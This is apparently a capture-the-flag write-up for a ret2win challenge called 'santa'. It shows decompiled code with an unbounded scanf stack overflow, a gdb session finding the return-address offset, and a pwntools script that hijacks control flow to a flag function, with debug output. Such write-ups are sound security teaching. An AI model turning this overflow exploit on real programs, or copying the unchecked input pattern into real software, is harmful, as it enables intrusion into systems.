# santa

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4[6]; // [rsp+0h] [rbp-30h] BYREF

  puts("What are you wishing for?");
  memset(v4, 0, 40);
  __isoc99_scanf("%s", v4);
  return 0;
}
```

IDA also shows a `flag` function:

```c
int flag()
{
  return system("cat flag");
}
```

So it’s a simple ret2win challenge. Just overflow the buffer and call the `flag` function

```bash
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

PIE is disabled, so we can just hardcode the function address

Let’s get the offset:

```bash
gdb-peda$ pattern create 100 
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r
Starting program: /home/toma/tfc/santa/santa 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
What are you wishing for?
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x0 
RDX: 0x1 
RSI: 0xa ('\n')
RDI: 0x7fffffffde30 --> 0x19dfe69 
RBP: 0x4147414131414162 ('bAA1AAGA')
RSP: 0x7fffffffe3a8 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RIP: 0x4011f4 (<main+100>:	ret)
R8 : 0x0 
R9 : 0x7ffff7fd9d00 (<_dl_fini>:	endbr64)
R10: 0x0 
R11: 0x0 
R12: 0x7fffffffe4c8 --> 0x7fffffffe72a ("/home/toma/tfc/santa/santa")
R13: 0x401190 (<main>:	endbr64)
R14: 0x0 
R15: 0x7ffff7ffbc40 --> 0x50d1300000000
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011e9 <main+89>:	call   0x401080 <__isoc99_scanf@plt>
   0x4011ee <main+94>:	mov    eax,0x0
   0x4011f3 <main+99>:	leave  
=> 0x4011f4 <main+100>:	ret    
   0x4011f5:	add    BYTE PTR [rax],al
   0x4011f7:	add    bl,dh
   0x4011f9 <_fini+1>:	nop    edx
   0x4011fc <_fini+4>:	sub    rsp,0x8
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe3a8 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0x7fffffffe3b0 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0x7fffffffe3b8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0x7fffffffe3c0 ("AJAAfAA5AAKAAgAA6AAL")
0032| 0x7fffffffe3c8 ("AAKAAgAA6AAL")
0040| 0x7fffffffe3d0 --> 0x4c414136 ('6AAL')
0048| 0x7fffffffe3d8 --> 0xf4d42c74b9298ea 
0056| 0x7fffffffe3e0 --> 0x7fffffffe4c8 --> 0x7fffffffe72a ("/home/toma/tfc/santa/santa")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011f4 in main ()
gdb-peda$ pattern offset AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL found at offset: 56
```

So just fill the buffer and overwrite the return address

```python
from pwn import *

context.log_level = 'debug'

elf = ELF("./santa")

r = process("./santa")

r.clean()
r.sendline(b"A" * 56 + p64(next(elf.search(asm("ret")))) + p64(elf.sym['flag']))
flag = r.recvuntil("}")
log.success(f"{flag=}")
```

We also need to jump to a `ret` instruction before the `flag` function because some versions of libc use `movaps` instructions that require the stack to be 16-bytes aligned

```python
[*] '/home/toma/tfc/santa/santa'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './santa' argv=[b'./santa'] : pid 3963
[DEBUG] Received 0x1a bytes:
    b'What are you wishing for?\n'
[DEBUG] cpp -C -nostdinc -undef -P -I/home/toma/.local/lib/python3.9/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    .p2align 2
    _start:
    __start:
    .intel_syntax noprefix
    ret
[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-4dqqlali/step2 /tmp/pwn-asm-4dqqlali/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-4dqqlali/step3 /tmp/pwn-asm-4dqqlali/step4
[DEBUG] Sent 0x49 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000030  41 41 41 41  41 41 41 41  1a 10 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000040  76 11 40 00  00 00 00 00  0a                        │v·@·│····│·│
    00000049
/home/toma/tfc/santa/exploit.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  flag = r.recvuntil("}")
[DEBUG] Received 0xb bytes:
    b'FLAG{fake}\n'
[+] flag=b'FLAG{fake}'
[*] Stopped process './santa' (pid 3963)
```